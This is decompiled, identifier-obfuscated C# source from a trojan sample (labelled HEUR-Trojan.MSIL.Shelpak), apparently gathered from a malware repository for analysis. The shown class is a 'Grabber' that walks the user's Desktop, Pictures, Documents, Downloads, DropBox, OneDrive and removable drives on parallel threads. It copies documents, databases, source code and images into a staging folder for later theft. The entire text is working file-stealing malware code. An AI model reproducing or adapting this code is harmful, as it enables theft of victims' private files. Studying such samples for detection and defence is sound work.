// Decompiled with JetBrains decompiler
// Type: 見匚阜子攴方土石舛夂革心又.豸止髟己亠小豆爿日几厶
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using 曰乙屮月彡乙夊禾寸白衣匚子頁冖;
using 火長宀舛火尸彐方自儿丿广;

namespace 見匚阜子攴方土石舛夂革心又
{
  internal sealed class 豸止髟己亠小豆爿日几厶
  {
    private static string 支十龠片田片衣尢匕黍儿牙 = "Grabber";
    private static List<string> 己殳片木文廴戶广己穴囗 = new List<string>()
    {
      Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
      Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
      Environment.GetFolderPath(Environment.SpecialFolder.Personal),
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
      Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
    };

    private static string 子山禸貝黹几老黍谷歹刀殳(string 夕角歹見艮夕皮广身冫夕用糸糸)
    {
      if (!(夕角歹見艮夕皮广身冫夕用糸糸 == "Document"))
      {
        if (!(夕角歹見艮夕皮广身冫夕用糸糸 == "DataBase"))
        {
          if (!(夕角歹見艮夕皮广身冫夕用糸糸 == "SourceCode"))
          {
            if (夕角歹見艮夕皮广身冫夕用糸糸 == "Image")
              ++丿士止土巾幺山田巾弋宀小.手鼻曰巛己比面冖尸臼入父;
          }
          else
            ++丿士止土巾幺山田巾弋宀小.寸黑穴巾月卜疋羊彡鹿戶;
        }
        else
          ++丿士止土巾幺山田巾弋宀小.巾角儿戈身气癶力魚鬲亠戈口;
      }
      else
        ++丿士止土巾幺山田巾弋宀小.弓酉辵靑尸戶冖广石犬臣;
      return 夕角歹見艮夕皮广身冫夕用糸糸;
    }

    private static string 走火彳卩舛歹立人爻厂癶辵日(string 囗鼻彡网廾香无犬方耳示舌毛言)
    {
      string lower = 囗鼻彡网廾香无犬方耳示舌毛言.Replace(".", "").ToLower();
      foreach (KeyValuePair<string, string[]> keyValuePair in 儿白舌二无干幺麻水鹿羊耳.彳几矛鬥甘食皮冖二工工鼻)
      {
        foreach (string str in keyValuePair.Value)
        {
          if (lower.Equals(str))
            return 豸止髟己亠小豆爿日几厶.子山禸貝黹几老黍谷歹刀殳(keyValuePair.Key);
        }
      }
      return (string) null;
    }

    private static void 釆水幺靑邑歹勹十山毛疋日殳牙(string 衣山卩舌子小曰尸爻片豸立缶)
    {
      FileInfo fileInfo = new FileInfo(衣山卩舌子小曰尸爻片豸立缶);
      if (fileInfo.Length > (long) 儿白舌二无干幺麻水鹿羊耳.禸匕丨卩手牙龍彐里十禾豆夕見 || 豸止髟己亠小豆爿日几厶.走火彳卩舛歹立人爻厂癶辵日(fileInfo.Extension) == null)
        return;
      string str = Path.Combine(豸止髟己亠小豆爿日几厶.支十龠片田片衣尢匕黍儿牙, Path.GetDirectoryName(衣山卩舌子小曰尸爻片豸立缶).Replace(Path.GetPathRoot(衣山卩舌子小曰尸爻片豸立缶), "DRIVE-" + Path.GetPathRoot(衣山卩舌子小曰尸爻片豸立缶).Replace(":", "")));
      string destFileName = Path.Combine(str, fileInfo.Name);
      if (!Directory.Exists(str))
        Directory.CreateDirectory(str);
      fileInfo.CopyTo(destFileName, true);
    }

    private static void 木己卩弓韋犬己土人舟父比丨(string 彐毋夊女勹水亅攴斤子鼎立幺舌巛彳卜)
    {
      if (!Directory.Exists(彐毋夊女勹水亅攴斤子鼎立幺舌巛彳卜))
        return;
      string[] directories;
      string[] files;
      try
      {
        directories = Directory.GetDirectories(彐毋夊女勹水亅攴斤子鼎立幺舌巛彳卜);
        files = Directory.GetFiles(彐毋夊女勹水亅攴斤子鼎立幺舌巛彳卜);
      }
      catch (UnauthorizedAccessException ex)
      {
        return;
      }
      catch (AccessViolationException ex)
      {
        return;
      }
      foreach (string 衣山卩舌子小曰尸爻片豸立缶 in files)
        豸止髟己亠小豆爿日几厶.釆水幺靑邑歹勹十山毛疋日殳牙(衣山卩舌子小曰尸爻片豸立缶);
      foreach (string 彐毋夊女勹水亅攴斤子鼎立幺舌巛彳卜1 in directories)
      {
        try
        {
          豸止髟己亠小豆爿日几厶.木己卩弓韋犬己土人舟父比丨(彐毋夊女勹水亅攴斤子鼎立幺舌巛彳卜1);
        }
        catch
        {
        }
      }
    }

    public static void 犬入斗几山小干冖父廾夕自干(string 舟而囗几辰囗立齊屮毋穴弋冖)
    {
      try
      {
        豸止髟己亠小豆爿日几厶.支十龠片田片衣尢匕黍儿牙 = 舟而囗几辰囗立齊屮毋穴弋冖;
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.DriveType == DriveType.Removable && drive.IsReady)
            豸止髟己亠小豆爿日几厶.己殳片木文廴戶广己穴囗.Add(drive.RootDirectory.FullName);
        }
        if (!Directory.Exists(豸止髟己亠小豆爿日几厶.支十龠片田片衣尢匕黍儿牙))
          Directory.CreateDirectory(豸止髟己亠小豆爿日几厶.支十龠片田片衣尢匕黍儿牙);
        List<Thread> threadList = new List<Thread>();
        foreach (string str in 豸止髟己亠小豆爿日几厶.己殳片木文廴戶广己穴囗)
        {
          // ISSUE: object of a compiler-generated type is created
          // ISSUE: variable of a compiler-generated type
          豸止髟己亠小豆爿日几厶.手刀毛勹匚瓜衣女己虍水皮爿 手刀毛勹匚瓜衣女己虍水皮爿 = new 豸止髟己亠小豆爿日几厶.手刀毛勹匚瓜衣女己虍水皮爿();
          // ISSUE: reference to a compiler-generated field
          手刀毛勹匚瓜衣女己虍水皮爿.气尢牙广虫宀一邑广文大又鳥山靑冂 = str;
          try
          {
            // ISSUE: reference to a compiler-generated method
            threadList.Add(new Thread(new ThreadStart(手刀毛勹匚瓜衣女己虍水皮爿.\u003CRun\u003Eb__0)));
          }
          catch
          {
          }
        }
        foreach (Thread thread in threadList)
          thread.Start();
        foreach (Thread thread in threadList)
        {
          if (thread.IsAlive)
            thread.Join();
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
    }
  }
}
